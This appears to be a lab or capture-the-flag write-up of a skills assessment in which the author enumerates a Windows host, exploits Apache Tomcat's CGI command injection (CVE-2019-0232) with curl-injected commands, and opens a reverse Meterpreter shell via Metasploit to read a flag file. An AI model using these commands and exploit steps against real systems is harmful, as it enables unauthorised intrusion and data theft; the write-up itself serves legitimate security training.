## Attacking Common Applications- Skills Assessment I Write-up


### Objective

The goal of this assessment was to perform service enumeration to identify vulnerable applications, achieve remote code execution (RCE) to gain a foothold, and retrieve the `flag.txt` file.


### Reconnaissance

I began with a full TCP port scan to identify services running on the target:

```bash
sudo nmap -sS -T4 -p- <target_ip> --open
```

Key open ports discovered (selected):

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8000/tcp  open  http-alt
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
47001/tcp open  winrm
```

A focused default-script scan against the HTTP ports was run:

```bash
sudo nmap -sC -p80,8000,8009,8080 <target_ip>
```

This showed:

```
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Freight Logistics, Inc
| http-methods: 
|_  Potentially risky methods: TRACE
8000/tcp open  http-alt
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
8009/tcp open  ajp13
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
```

 - **Port 80**: site title “Freight Logistics, Inc”
 - **Port 8000**: robots.txt disallows `/`
 - **Port 8080**: `pache Tomcat/9.0.0.M1` (Tomcat instance present)

From these results we identified Tomcat running on port `8080`, and the presence of an AJP port (`8009`). Tomcat version might be vulnerable.


### Initial Application Enumeration

I investigated the Tomcat instance for management interfaces (`/manager/html`, `/host-manager/html`), but did not find a login page that could be used to authenticate as administrator. So I searched for known Tomcat attack vectors applicable to this version.

Because `Tomcat/9.0.0.M1` is present, I reviewed known Tomcat vulnerabilities and confirmed *CVE-2019-0232* (CGIServlet `enableCmdLineArguments` command-injection) is relevant: this vulnerability allows the CGI servlet to pass attacker-controlled data to system commands when `enableCmdLineArguments` is enabled, resulting in command injection/RCE on affected configurations (Windows targets when CGI scripts are present).


#### Finding CGI Scripts

I searched for CGI scripts on the Tomcat webroot using `ffuf` with a common wordlist, probing for `.cmd` or `.bat` files under `/cgi`:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target_ip>:8080/cgi/FUZZ.cmd
```
and
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target_ip>:8080/cgi/FUZZ.bat
```


This discovered `cmd.bat` at `/cgi/cmd.bat`.

I verified the file exists and is accessible:

```bash
[★]$ curl -i http://<target_ip>:8080/cgi/cmd.bat

HTTP/1.1 200 
Server: Apache-Coyote/1.1
Content-Type: text/plain
...
```


### Verifying Command Injection

`CVE-2019-0232` allows supplying command-line arguments to the CGI script; passing additional arguments (using `&` or by including arguments after `?`) can execute OS commands.

I tested by appending a simple dir command:

```bash
curl "http://<target_ip>:8080/cgi/cmd.bat?&dir"
```

The server responded with a directory listing of the CGI directory:

```bash
 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi
 09/29/2021  09:26 AM    <DIR>          .
 09/29/2021  09:26 AM    <DIR>          ..
 09/01/2021  07:58 AM    <DIR>          %SystemDrive%
 09/29/2021  09:26 AM            73,802 bHPVV.exe
 08/31/2021  01:55 PM                48 cmd.bat

...
```

This confirmed command execution via the CGI servlet.

When reading files, URL-encoding and how spaces are encoded matters. I observed the server handled `+` for spaces better than `%20` for these parameter encodings. Example working directory listing of Administrator Desktop:

```bash
[★]$ curl "http://<target_ip>:8080/cgi/cmd.bat?&dir+C%3A%5CUsers%5CAdministrator%5CDesktop"

Directory of C:\Users\Administrator\Desktop

09/30/2021  10:41 AM    <DIR>          .
09/30/2021  10:41 AM    <DIR>          ..
09/29/2021  09:22 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  28,276,125,696 bytes free
```

I also tested executing binary output (e.g., `whoami.exe`) to confirm the `type` command works; `curl` warns for binary output but the call still demonstrated execution:

```bash
[★]$ curl "http://<target_ip>:8080/cgi/cmd.bat?&type+C%3A%5Cwindows%5Csystem32%5Cwhoami.exe"

Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

However, attempts to type the `flag.txt` via direct `curl` requests were inconsistent — likely due to how the CGI parameter parsing handled command arguments and output buffering — so I switched to a more reliable exploitation method (**Metasploit**) to get an interactive session and read the file directly.


### Exploitation — Gaining a Foothold

Metasploit module: `exploit/windows/http/tomcat_cgi_cmdlineargs` (CVE-2019-0232)

Metasploit usage (selected steps):

```bash
msfconsole -q
search Tomcat cgi
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set TARGETURI /cgi/cmd.bat
set AutoCheck false
run
```

If the `AutoCheck` parameter is left enabled, the exploit fails:

```bash
[*] Started reverse TCP handler on <attacker_ip>:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
The exploit staged a command stager and delivered a Meterpreter payload. A session was opened:

```bash
[*] Meterpreter session 1 opened (<attacker_ip>:4444 -> <target_ip>:49688) at ...
```

I navigated the file system from the Meterpreter prompt to confirm the environment and locate the flag.


### Post-Exploitation — Locating and Retrieving flag.txt

From Meterpreter I listed the CGI directory to confirm spawn location:

```bash
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > dir 

Listing: C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi
========================================================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2021-09-01 09:58:06 -0500  %SystemDrive%
100777/rwxrwxrwx  73802  fil   2021-09-29 11:26:19 -0500  bHPVV.exe
100777/rwxrwxrwx  48     fil   2021-08-31 15:55:04 -0500  cmd.bat
100777/rwxrwxrwx  73802  fil   2025-10-09 06:50:47 -0500  vrmlE.exe

```

I then listed the Administrator Desktop to find the `flag.txt`.

> ⚠️ *Note: in Meterpreter, backslashes inside paths need to be escaped (double \\)*

```bash
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > dir C:\\Users\\Administrator\\Desktop

Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-08-16 22:48:56 -0500  desktop.ini
100666/rw-rw-rw-  32    fil   2021-09-29 11:22:44 -0500  flag.txt

```

Finally I read the file:

```bash
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:\\Users\\Administrator\\Desktop\\flag.txt

<flag_content>
```


## Results & Conclusion

I enumerated the target and found multiple services including an `Apache Tomcat` instance on port `8080`.

I discovered a CGI script (`/cgi/cmd.bat`) and validated that the CGI Servlet allowed command-line arguments to be passed — enabling command execution on the host (`CVE-2019-0232`).

Using the vulnerability I obtained a Meterpreter session and retrieved the flag located at `C:\Users\Administrator\Desktop\flag.txt`.

The assessment demonstrates a critical RCE risk when CGI scripts are present and Tomcat is misconfigured to allow command-line arguments.


## Key Takeaways

 - Comprehensive port/service enumeration reveals attack avenues (Tomcat + CGI + Windows).
 - Known CVEs (`CVE-2019-0232`) and targeted probing can yield RCE when server-side scripts accept unsafe input.
 - Observed that URL-encoding differences (`+` vs `%20`) affected command parsing: `curl` could list directories but could not reliably `type` the `flag.txt`, so `Metasploit` was used to obtain an interactive session and read the file.
